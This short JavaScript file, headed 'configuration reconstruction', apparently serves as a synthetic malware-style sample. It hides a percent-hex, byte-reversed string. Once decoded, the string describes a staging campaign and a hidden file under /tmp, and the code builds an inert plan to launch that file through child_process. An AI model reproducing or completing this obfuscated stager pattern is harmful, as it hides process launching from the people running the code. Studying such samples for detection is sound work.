// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_d9b4cd0c = "%73%6a%6d%2e%32%61%35%36%33%61%36%36%38%32%33%30%2d%65%67%61%74%73%2e%2f%65%64%6f%6e%2d%73%73%65%72%74%6e%75%68%2f%70%6d%74%2f%3d%68%74%61%70%5f%65%6c%69%66%7c%33%41%36%36%38%32%33%30%2d%45%44%4f%4e%3d%64%69%5f%6e%67%69%61%70%6d%61%63%7c%31%3d%74%6e%75%6f%63%5f%65%67%61%74%73%7c%65%6c%69%66%5f%6e%77%61%70%73%3d%72%65%74%70%61%64%61%7c%73%73%65%63%6f%72%70%5f%68%63%74%61%70%73%69%64%2c%6c%61%63%6f%6c%5f%65%74%61%63%6f%6c%3d%73%70%65%74%73%7c%31%3d%76";
const Codec_d9b4cd0c = "percent_hex|reverse_bytes|";

function load_d9b4cd0c() { return [...Material_d9b4cd0c.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_d9b4cd0c(storedBytes) { return [...storedBytes].reverse(); }
async function recover_d9b4cd0c() {
  const harmlessValue = ["north", "south"].join(":");
  const storedBytes = load_d9b4cd0c(); let recoveredBytes = [];
  recoveredBytes = decode_d9b4cd0c(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_d9b4cd0c() { return ({ ...{ value: await recover_d9b4cd0c() } }).value; }
async function plan_d9b4cd0c() { const inspect = inspect_d9b4cd0c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "spawn_file", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_d9b4cd0c;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_d9b4cd0c());

// reconstruction complete